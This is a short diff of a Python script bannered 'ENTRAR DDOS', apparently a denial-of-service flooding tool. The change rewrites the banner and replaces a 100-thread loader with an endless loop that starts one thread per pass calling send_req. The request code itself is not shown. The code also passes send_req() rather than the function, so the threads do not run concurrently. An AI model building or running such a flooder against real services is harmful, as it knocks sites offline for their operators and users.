@@ -14,7 +14,7 @@ dotenv.load_dotenv()
 
 print(
     """
-ミ★ 𝘌𝘕𝘛𝘙𝘈𝘙 𝘋𝘋𝘖𝘚 ★彡
+ミ★ ENTRAR DDOS ★彡
 """
 )
 
@@ -46,18 +46,13 @@ def send_req():
 threads = []
 
 
-def load_threads():
-    for i in range(100):
-        i = threading.Thread(target=send_req())
-        threads.append(i)
-
-
 def run():
-    for t in threads:
-        t.start()
+    t = threading.Thread(target=send_req())
+    t.start()
+    
+
 
 
 if __name__ == "__main__":
     while True:
-        load_threads()
         run()
